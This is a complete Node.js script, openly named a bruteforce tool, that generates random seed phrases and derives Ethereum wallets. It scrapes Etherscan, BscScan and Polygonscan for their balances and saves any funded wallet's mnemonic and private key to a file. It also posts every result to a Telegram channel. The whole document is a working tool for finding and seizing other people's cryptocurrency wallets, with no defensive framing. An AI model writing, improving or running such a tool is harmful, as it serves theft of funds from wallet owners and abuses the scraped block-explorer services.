const { ethers } = require('ethers');
const axios = require('axios');
const bip39 = require('bip39');
const moment = require('moment');
const cheerio = require('cheerio');
const fs = require('fs-extra');
const TelegramBot = require('node-telegram-bot-api');
require('colors');

const TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
const CHANNEL_ID = '@your_channel_name'; // Replace with your channel ID or username

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function logger(message, type) {
  switch (type) {
    case 'info':
      console.log(`[${moment().format('HH:mm:ss')}] ${message}`);
      break;
    case 'success':
      console.log(`[${moment().format('HH:mm:ss')}] ${message}`.green);
      break;
    case 'error':
      console.error(`[${moment().format('HH:mm:ss')}] ${message}`.red);
      break;
    case 'warning':
      console.warn(`[${moment().format('HH:mm:ss')}] ${message}`.yellow);
      break;
    default:
      console.log(`[${moment().format('HH:mm:ss')}] ${message}`);
  }
}

function generateSeedPhrase() {
  const randomLength = Math.random() > 0.5 ? 24 : 12;
  const randomBytes = require('crypto').randomBytes(randomLength === 24 ? 32 : 16);
  return bip39.entropyToMnemonic(randomBytes.toString('hex'));
}

function scrapeBlockscan(address, type = 'etherscan') {
  const url = `https://${type}.com/address/${address}`;
  return axios.get(url)
    .then(response => {
      const $ = cheerio.load(response.data);
      const balance = $('#ContentPlaceHolder1_divSummary > div.row.g-3.mb-4 > div:nth-child(1) > div > div > div:nth-child(3)').text();
      const balanceResult = balance.split('\n')[4];
      return balanceResult !== undefined ? balanceResult : '$0.00';
    })
    .catch(async () => {
      await delay(10000);
      return '$0.00';
    });
}

async function runBruteforce() {
  while (true) {
    try {
      const resSeedPhrase = generateSeedPhrase();
      const resEtherWallet = ethers.Wallet.fromPhrase(resSeedPhrase);
      const [resEthBalance, resBnbBalance, resMaticBalance] = await Promise.all([
        scrapeBlockscan(resEtherWallet.address, 'etherscan'),
        scrapeBlockscan(resEtherWallet.address, 'bscscan'),
        scrapeBlockscan(resEtherWallet.address, 'polygonscan')
      ]);

      logger(`👾 Address: ${resEtherWallet.address}`, 'info');
      logger(`💬 Mnemonic: ${resEtherWallet.mnemonic.phrase}`, 'info');
      logger(`🔑 Private key: ${resEtherWallet.privateKey}`, 'info');
      logger(`🤑 ETH Balance: ${resEthBalance}`, 'info');
      logger(`🤑 BNB Balance: ${resBnbBalance}`, 'info');
      logger(`🤑 MATIC Balance: ${resMaticBalance}`, 'info');

      if (resEthBalance !== '$0.00' || resBnbBalance !== '$0.00' || resMaticBalance !== '$0.00') {
        logger(`🎉 Found a wallet with a non-zero balance!`, 'success');

        const walletInfo = `👾 Address: ${resEtherWallet.address}\n💬 Mnemonic: ${resEtherWallet.mnemonic.phrase}\n🔑 Private key: ${resEtherWallet.privateKey}\n🤑 ETH Balance: ${resEthBalance}\n🤑 BNB Balance: ${resBnbBalance}\n🤑 MATIC Balance: ${resMaticBalance}\n\n`;

        await fs.appendFileSync('wallets.txt', walletInfo);

        // Send message to Telegram channel
        bot.sendMessage(CHANNEL_ID, `🎉 Found a wallet with a non-zero balance!\n\n${walletInfo}`);
      } else {
        logger(`👎 No luck this time.`, 'warning');

        const noBalanceInfo = `👾 Address: ${resEtherWallet.address}\n💬 Mnemonic: ${resEtherWallet.mnemonic.phrase}\n🔑 Private key: ${resEtherWallet.privateKey}\n😔 No balance found.\n\n`;

        // Send message to Telegram channel
        bot.sendMessage(CHANNEL_ID, `No balance found in this wallet:\n\n${noBalanceInfo}`);
      }
      await delay(1000);
    } catch (error) {
      logger(`An error occurred: ${error.message}`, 'error');

      // Send error message to Telegram channel
      bot.sendMessage(CHANNEL_ID, `⚠️ An error occurred: ${error.message}`);
    }
    console.log('');
  }
}

runBruteforce();
